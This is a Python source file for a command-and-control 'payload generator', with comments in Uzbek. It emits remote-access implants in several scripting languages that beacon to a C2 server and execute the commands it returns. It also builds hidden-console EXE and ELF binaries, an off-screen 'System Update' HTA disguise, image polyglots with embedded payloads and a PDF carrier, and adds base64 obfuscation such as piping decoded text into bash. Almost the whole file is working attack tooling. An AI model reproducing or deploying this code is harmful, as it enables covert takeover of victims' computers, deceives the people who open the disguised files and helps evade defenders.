"""
C2 Platform - Payload Generator
Turli formatdagi payloadlar yaratish
"""

import base64
import os
import sys
from datetime import datetime
from typing import Dict, Any, Optional

# Common modullarni import
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import SERVER_HOST, SERVER_PORT


class PayloadGenerator:
    """Payload generator klassi"""
    
    def __init__(self, server_host: str = SERVER_HOST, server_port: int = SERVER_PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.templates = {
            'python': self._get_python_template(),
            'powershell': self._get_powershell_template(),
            'bash': self._get_bash_template(),
            'batch': self._get_batch_template(),
            'vbs': self._get_vbs_template(),
            'hta': self._get_hta_template(),
            'js': self._get_js_template(),
            'vbe': self._get_vbe_template()
        }
        self.steganography_formats = ['jpg', 'png', 'pdf']
    
    def generate(self, 
                 payload_type: str,
                 listener_type: str = 'http',
                 output_file: str = None,
                 obfuscate: bool = False) -> Dict[str, Any]:
        """
        Payload yaratish
        
        Args:
            payload_type: python, powershell, bash, batch, vbs, exe, dll
            listener_type: http, tcp
            output_file: Saqlash fayl nomi
            obfuscate: Obfuscation qilish
        """
        try:
            # Payload content yaratish
            if payload_type in self.templates:
                content = self._generate_script(payload_type, listener_type)
            elif payload_type == 'exe':
                content = self._generate_exe(listener_type, output_file)
            elif payload_type == 'dll':
                content = self._generate_dll(listener_type, output_file)
            elif payload_type == 'scr':
                content = self._generate_exe(listener_type, output_file)  # SCR = renamed EXE
            elif payload_type == 'elf':
                content = self._generate_elf(listener_type, output_file)
            elif payload_type == 'jpg':
                content = self._generate_jpg_payload(listener_type, output_file)
            elif payload_type == 'png':
                content = self._generate_png_payload(listener_type, output_file)
            elif payload_type == 'pdf':
                content = self._generate_pdf_payload(listener_type, output_file)
            else:
                return {'error': f'Noma\'lum payload turi: {payload_type}'}
            
            # Obfuscation
            if obfuscate and payload_type in ['python', 'powershell', 'bash']:
                content = self._obfuscate(content, payload_type)
            
            # Faylga saqlash
            if output_file:
                self._save_to_file(content, output_file, payload_type)
            
            return {
                'success': True,
                'type': payload_type,
                'listener': listener_type,
                'size': len(content),
                'content': content if payload_type != 'exe' else base64.b64encode(content).decode(),
                'output_file': output_file,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            return {'error': f'Payload yaratishda xato: {str(e)}'}
    
    def _generate_script(self, script_type: str, listener_type: str) -> str:
        """Script payload yaratish"""
        template = self.templates.get(script_type, '')
        
        # Template'da o'zgaruvchilarni almashtirish
        if listener_type == 'http':
            server_url = f"http://{self.server_host}:{self.server_port}"
        else:  # tcp
            server_url = f"{self.server_host}:{self.server_port}"
        
        content = template.replace('{{SERVER_HOST}}', self.server_host)
        content = content.replace('{{SERVER_PORT}}', str(self.server_port))
        content = content.replace('{{SERVER_URL}}', server_url)
        content = content.replace('{{LISTENER_TYPE}}', listener_type)
        
        return content
    
    def _get_python_template(self) -> str:
        """Python payload template"""
        return '''#!/usr/bin/env python3
"""
C2 Agent Payload - Python
Auto-generated: {timestamp}
"""

import requests
import subprocess
import json
import time
import socket
import uuid
from datetime import datetime

# Configuration
SERVER_URL = "{{SERVER_URL}}"
HEARTBEAT_INTERVAL = 30

def get_agent_id():
    """Generate unique agent ID"""
    return str(uuid.uuid4())

def get_system_info():
    """Collect system information"""
    import platform
    return {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }

def register(agent_id):
    """Register with C2 server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/api/register",
            json={"agent_id": agent_id, "agent_info": get_system_info()},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def heartbeat(agent_id):
    """Send heartbeat and get commands"""
    try:
        response = requests.post(
            f"{SERVER_URL}/api/heartbeat",
            json={"agent_id": agent_id, "timestamp": datetime.now().isoformat()},
            timeout=10
        )
        if response.status_code == 200:
            return response.json().get('commands', [])
    except:
        pass
    return []

def execute_command(cmd):
    """Execute shell command"""
    try:
        result = subprocess.run(
            cmd.get('data', ''),
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return {"stdout": result.stdout, "stderr": result.stderr}
    except Exception as e:
        return {"error": str(e)}

def main():
    """Main agent loop"""
    agent_id = get_agent_id()
    
    # Register
    if not register(agent_id):
        return
    
    # Main loop
    while True:
        try:
            commands = heartbeat(agent_id)
            for cmd in commands:
                if cmd.get('type') == 'exec':
                    execute_command(cmd)
            time.sleep(HEARTBEAT_INTERVAL)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_powershell_template(self) -> str:
        """PowerShell payload template"""
        return '''# C2 Agent Payload - PowerShell
# Auto-generated: {timestamp}

$SERVER_URL = "{{SERVER_URL}}"
$HEARTBEAT_INTERVAL = 30

function Get-AgentId {
    return [guid]::NewGuid().ToString()
}

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        platform = [Environment]::OSVersion.VersionString
        username = $env:USERNAME
        timestamp = Get-Date -Format "o"
    }
}

function Register-Agent($agentId) {
    try {
        $body = @{
            agent_id = $agentId
            agent_info = Get-SystemInfo
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$SERVER_URL/api/register" `
            -Method Post -Body $body -ContentType "application/json" `
            -TimeoutSec 10
        
        return $true
    } catch {
        return $false
    }
}

function Send-Heartbeat($agentId) {
    try {
        $body = @{
            agent_id = $agentId
            timestamp = Get-Date -Format "o"
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$SERVER_URL/api/heartbeat" `
            -Method Post -Body $body -ContentType "application/json" `
            -TimeoutSec 10
        
        return $response.commands
    } catch {
        return @()
    }
}

function Invoke-Command($cmd) {
    try {
        $output = Invoke-Expression $cmd.data 2>&1 | Out-String
        return @{ stdout = $output }
    } catch {
        return @{ error = $_.Exception.Message }
    }
}

# Main
$agentId = Get-AgentId

if (Register-Agent $agentId) {
    while ($true) {
        try {
            $commands = Send-Heartbeat $agentId
            foreach ($cmd in $commands) {
                if ($cmd.type -eq "exec") {
                    Invoke-Command $cmd
                }
            }
            Start-Sleep -Seconds $HEARTBEAT_INTERVAL
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}
'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_bash_template(self) -> str:
        """Bash payload template"""
        return '''#!/bin/bash
# C2 Agent Payload - Bash
# Auto-generated: {timestamp}

SERVER_URL="{{SERVER_URL}}"
HEARTBEAT_INTERVAL=30

get_agent_id() {
    cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen
}

get_system_info() {
    cat <<EOF
{
    "hostname": "$(hostname)",
    "platform": "$(uname -a)",
    "username": "$(whoami)",
    "timestamp": "$(date -Iseconds)"
}
EOF
}

register_agent() {
    local agent_id=$1
    local data=$(cat <<EOF
{
    "agent_id": "$agent_id",
    "agent_info": $(get_system_info)
}
EOF
)
    
    curl -s -X POST "$SERVER_URL/api/register" \\
        -H "Content-Type: application/json" \\
        -d "$data" >/dev/null 2>&1
    
    return $?
}

send_heartbeat() {
    local agent_id=$1
    local data=$(cat <<EOF
{
    "agent_id": "$agent_id",
    "timestamp": "$(date -Iseconds)"
}
EOF
)
    
    curl -s -X POST "$SERVER_URL/api/heartbeat" \\
        -H "Content-Type: application/json" \\
        -d "$data"
}

# Main
AGENT_ID=$(get_agent_id)

if register_agent "$AGENT_ID"; then
    while true; do
        commands=$(send_heartbeat "$AGENT_ID")
        # Process commands here
        sleep $HEARTBEAT_INTERVAL
    done
fi
'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_batch_template(self) -> str:
        """Batch payload template"""
        return '''@echo off
REM C2 Agent Payload - Batch
REM Auto-generated: {timestamp}

set SERVER_URL={{SERVER_URL}}
set AGENT_ID=%RANDOM%%RANDOM%%RANDOM%

:register
curl -s -X POST "%SERVER_URL%/api/register" -H "Content-Type: application/json" -d "{\\"agent_id\\":\\"%AGENT_ID%\\"}" >nul 2>&1

:loop
curl -s -X POST "%SERVER_URL%/api/heartbeat" -H "Content-Type: application/json" -d "{\\"agent_id\\":\\"%AGENT_ID%\\"}" 
timeout /t 30 /nobreak >nul
goto loop
'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_vbs_template(self) -> str:
        """VBScript payload template"""
        return '''' C2 Agent Payload - VBScript
' Auto-generated: {timestamp}

Dim serverURL, agentID
serverURL = "{{SERVER_URL}}"
agentID = CreateGUID()

Function CreateGUID()
    CreateGUID = Left(CreateObject("Scriptlet.TypeLib").Guid, 38)
End Function

Function HTTPPost(url, data)
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send data
    HTTPPost = http.responseText
End Function

' Register
HTTPPost serverURL & "/api/register", "{\\"agent_id\\":\\"" & agentID & "\\"}"

' Main loop
Do
    HTTPPost serverURL & "/api/heartbeat", "{\\"agent_id\\":\\"" & agentID & "\\"}"
    WScript.Sleep 30000
Loop
'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_hta_template(self) -> str:
        """HTA (HTML Application) payload template"""
        return '''<html>
<head>
<title>System Update</title>
<HTA:APPLICATION
    ID="SystemUpdate"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
/>
<script language="VBScript">
' C2 Agent Payload - HTA
' Auto-generated: {timestamp}

Dim serverURL, agentID
serverURL = "{{SERVER_URL}}"
agentID = CreateGUID()

Function CreateGUID()
    CreateGUID = Left(CreateObject("Scriptlet.TypeLib").Guid, 38)
End Function

Function HTTPPost(url, data)
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send data
    HTTPPost = http.responseText
End Function

Sub Window_OnLoad
    ' Hide window
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    
    ' Register
    HTTPPost serverURL & "/api/register", "{{\\""agent_id\\"":\\""" & agentID & "\\""}}"
    
    ' Main loop
    Do
        HTTPPost serverURL & "/api/heartbeat", "{{\\""agent_id\\"":\\""" & agentID & "\\""}}"
        WScript.Sleep 30000
    Loop
End Sub
</script>
</head>
<body>
<p>Loading...</p>
</body>
</html>'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_js_template(self) -> str:
        """JScript payload template"""
        return '''// C2 Agent Payload - JScript
// Auto-generated: {timestamp}

var SERVER_URL = "{{SERVER_URL}}";
var HEARTBEAT_INTERVAL = 30000;

function createGUID() {{
    var typelib = new ActiveXObject("Scriptlet.TypeLib");
    return typelib.Guid.slice(0, 38);
}}

function getSystemInfo() {{
    var shell = new ActiveXObject("WScript.Shell");
    var network = new ActiveXObject("WScript.Network");
    
    return {{
        hostname: network.ComputerName,
        username: network.UserName,
        platform: "Windows"
    }};
}}

function httpPost(url, data) {{
    try {{
        var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
        http.open("POST", url, false);
        http.setRequestHeader("Content-Type", "application/json");
        http.send(data);
        return http.responseText;
    }} catch(e) {{
        return null;
    }}
}}

function register(agentId) {{
    var data = '{{
        "agent_id": "' + agentId + '",
        "agent_info": ' + JSON.stringify(getSystemInfo()) + '
    }}';
    
    return httpPost(SERVER_URL + "/api/register", data);
}}

function heartbeat(agentId) {{
    var data = '{{
        "agent_id": "' + agentId + '"
    }}';
    
    return httpPost(SERVER_URL + "/api/heartbeat", data);
}}

function executeCommand(cmd) {{
    try {{
        var shell = new ActiveXObject("WScript.Shell");
        var exec = shell.Exec("cmd.exe /c " + cmd);
        var output = exec.StdOut.ReadAll();
        return output;
    }} catch(e) {{
        return "Error: " + e.message;
    }}
}}

// Main
var agentId = createGUID();

if (register(agentId)) {{
    while (true) {{
        try {{
            var commands = heartbeat(agentId);
            // Process commands here
            WScript.Sleep(HEARTBEAT_INTERVAL);
        }} catch(e) {{
            WScript.Sleep(5000);
        }}
    }}
}}'''.replace('{timestamp}', datetime.now().isoformat())
    
    def _get_vbe_template(self) -> str:
        """VBE (Encoded VBScript) payload template"""
        # VBE bu encoded VBS. Hozircha oddiy VBS qaytaramiz
        # Keyinchalik Microsoft Script Encoder bilan encode qilish mumkin
        return '''#@~^' C2 Agent - VBE Encoded
' Auto-generated: {timestamp}
' Note: This is base VBS, needs encoding with Microsoft Script Encoder

''' + self._get_vbs_template()
    
    def _generate_exe(self, listener_type: str, output_file: str = None) -> bytes:
        """EXE payload yaratish (PyInstaller kerak)"""
        import tempfile
        import subprocess
        
        try:
            # Python script yaratish
            python_code = self._generate_script('python', listener_type)
            
            # Temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                temp_py = f.name
                f.write(python_code)
            
            # PyInstaller command
            cmd = [
                'pyinstaller',
                '--onefile',           # Single EXE
                '--noconsole',         # No console window
                '--clean',
                temp_py
            ]
            
            # PyInstaller ishlatish
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # EXE faylni o'qish
                exe_path = temp_py.replace('.py', '.exe')
                with open(exe_path, 'rb') as f:
                    exe_content = f.read()
                
                # Cleanup
                import os
                os.remove(temp_py)
                if os.path.exists(exe_path):
                    os.remove(exe_path)
                
                return exe_content
            else:
                raise Exception(f"PyInstaller error: {result.stderr}")
                
        except FileNotFoundError:
            # PyInstaller o'rnatilmagan
            return b"ERROR: PyInstaller not installed. Run: pip install pyinstaller"
        except Exception as e:
            return f"ERROR: {str(e)}".encode()
    
    def _generate_dll(self, listener_type: str, output_file: str = None) -> bytes:
        """DLL payload yaratish"""
        # DLL yaratish uchun PyInstaller --shared ishlatish mumkin
        # Yoki ctypes DLL wrapper
        return b"DLL_PAYLOAD: Requires PyInstaller with --shared flag or custom DLL builder"
    
    def _generate_elf(self, listener_type: str, output_file: str = None) -> bytes:
        """ELF payload yaratish (Linux executable)"""
        import tempfile
        import subprocess
        
        try:
            # Python script yaratish
            python_code = self._generate_script('python', listener_type)
            
            # Temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                temp_py = f.name
                f.write(python_code)
            
            # PyInstaller command (Linux)
            cmd = [
                'pyinstaller',
                '--onefile',
                '--clean',
                temp_py
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # ELF binary o'qish
                elf_path = os.path.join('dist', os.path.basename(temp_py).replace('.py', ''))
                with open(elf_path, 'rb') as f:
                    elf_content = f.read()
                
                # Cleanup
                os.remove(temp_py)
                if os.path.exists(elf_path):
                    os.remove(elf_path)
                
                return elf_content
            else:
                raise Exception(f"PyInstaller error: {result.stderr}")
                
        except Exception as e:
            return f"ERROR: {str(e)}".encode()
    
    def _generate_jpg_payload(self, listener_type: str, output_file: str = None) -> bytes:
        """JPG polyglot payload yaratish (steganography)"""
        try:
            from PIL import Image
            import io
            
            # Python payload yaratish
            python_payload = self._generate_script('python', listener_type)
            
            # Dummy JPG yaratish (1x1 pixel)
            img = Image.new('RGB', (100, 100), color='white')
            
            # Add text to image
            try:
                from PIL import ImageDraw, ImageFont
                draw = ImageDraw.Draw(img)
                draw.text((10, 40), "System Update", fill='black')
            except:
                pass
            
            # JPG bytes olish
            jpg_buffer = io.BytesIO()
            img.save(jpg_buffer, format='JPEG', quality=95)
            jpg_data = jpg_buffer.getvalue()
            
            # Polyglot: JPG + Python payload
            # JPG oxiridan keyin payload qo'shish
            polyglot_data = jpg_data + b'\n' + b'#' * 50 + b'\n'
            polyglot_data += b'# Embedded payload - extract with: tail -n +<line> file.jpg | python\n'
            polyglot_data += python_payload.encode()
            
            return polyglot_data
            
        except ImportError:
            return b"ERROR: Pillow required. Run: pip install Pillow"
        except Exception as e:
            return f"ERROR: {str(e)}".encode()
    
    def _generate_png_payload(self, listener_type: str, output_file: str = None) -> bytes:
        """PNG polyglot payload yaratish"""
        try:
            from PIL import Image
            import io
            
            # Python payload
            python_payload = self._generate_script('python', listener_type)
            
            # PNG yaratish
            img = Image.new('RGBA', (200, 100), color=(255, 255, 255, 0))
            
            try:
                from PIL import ImageDraw
                draw = ImageDraw.Draw(img)
                draw.text((20, 40), "Loading...", fill='black')
            except:
                pass
            
            # PNG bytes
            png_buffer = io.BytesIO()
            img.save(png_buffer, format='PNG')
            png_data = png_buffer.getvalue()
            
            # Polyglot file
            polyglot_data = png_data + b'\n'
            polyglot_data += b'# Embedded Python payload\n'
            polyglot_data += python_payload.encode()
            
            return polyglot_data
            
        except ImportError:
            return b"ERROR: Pillow required. Run: pip install Pillow"
        except Exception as e:
            return f"ERROR: {str(e)}".encode()
    
    def _generate_pdf_payload(self, listener_type: str, output_file: str = None) -> bytes:
        """PDF payload yaratish (embedded JavaScript)"""
        try:
            # PDF with embedded JavaScript
            python_payload = self._generate_script('python', listener_type)
            
            # Base64 encode payload
            import base64
            encoded_payload = base64.b64encode(python_payload.encode()).decode()
            
            # PDF structure with JavaScript
            pdf_content = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert("Loading document...");) >>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
BT
/F1 12 Tf
50 700 Td
(System Update Document) Tj
ET
endstream
endobj

5 0 obj
<<
/Type /EmbeddedFile
/Subtype /application#2Fpython
/Length {len(encoded_payload)}
>>
stream
{encoded_payload}
endstream
endobj

xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000120 00000 n
0000000179 00000 n
0000000380 00000 n
0000000530 00000 n
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
{600 + len(encoded_payload)}
%%EOF
'''
            
            # Add extraction instructions as comment
            pdf_content += f"\n% Embedded Python payload (base64)\n"
            pdf_content += f"% Extract: grep 'stream' file.pdf | base64 -d | python\n"
            
            return pdf_content.encode()
            
        except Exception as e:
            return f"ERROR: {str(e)}".encode()
    
    def _obfuscate(self, content: str, script_type: str) -> str:
        """Script obfuscation"""
        if script_type == 'python':
            # Python obfuscation - base64 encoding
            import base64
            encoded = base64.b64encode(content.encode()).decode()
            return f'''import base64
exec(base64.b64decode("{encoded}").decode())'''
        
        elif script_type == 'powershell':
            # PowerShell obfuscation
            import base64
            encoded = base64.b64encode(content.encode('utf-16le')).decode()
            return f'powershell -EncodedCommand {encoded}'
        
        elif script_type == 'bash':
            # Bash obfuscation - base64
            import base64
            encoded = base64.b64encode(content.encode()).decode()
            return f'''echo "{encoded}" | base64 -d | bash'''
        
        return content
    
    def _save_to_file(self, content: Any, filename: str, payload_type: str):
        """Faylga saqlash"""
        mode = 'wb' if isinstance(content, bytes) else 'w'
        
        with open(filename, mode) as f:
            f.write(content)
        
        # Linux/macOS uchun executable qilish
        if payload_type in ['python', 'bash'] and os.name != 'nt':
            os.chmod(filename, 0o755)


def generate_payload_cli():
    """CLI interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description='C2 Payload Generator')
    parser.add_argument('-t', '--type', required=True,
                       choices=['python', 'powershell', 'bash', 'batch', 'vbs', 
                               'hta', 'js', 'vbe', 'exe', 'dll', 'scr', 'elf',
                               'jpg', 'png', 'pdf'],
                       help='Payload turi')
    parser.add_argument('-l', '--listener', default='http',
                       choices=['http', 'tcp'],
                       help='Listener turi')
    parser.add_argument('-H', '--host', default='127.0.0.1',
                       help='Server host')
    parser.add_argument('-p', '--port', type=int, default=8080,
                       help='Server port')
    parser.add_argument('-o', '--output', required=True,
                       help='Output fayl nomi')
    parser.add_argument('--obfuscate', action='store_true',
                       help='Obfuscation qilish')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator(args.host, args.port)
    result = generator.generate(
        payload_type=args.type,
        listener_type=args.listener,
        output_file=args.output,
        obfuscate=args.obfuscate
    )
    
    if result.get('success'):
        print(f"✅ Payload yaratildi:")
        print(f"   Type: {result['type']}")
        print(f"   Listener: {result['listener']}")
        print(f"   Size: {result['size']} bytes")
        print(f"   Output: {result['output_file']}")
    else:
        print(f"❌ Xato: {result.get('error')}")


if __name__ == "__main__":
    generate_payload_cli()
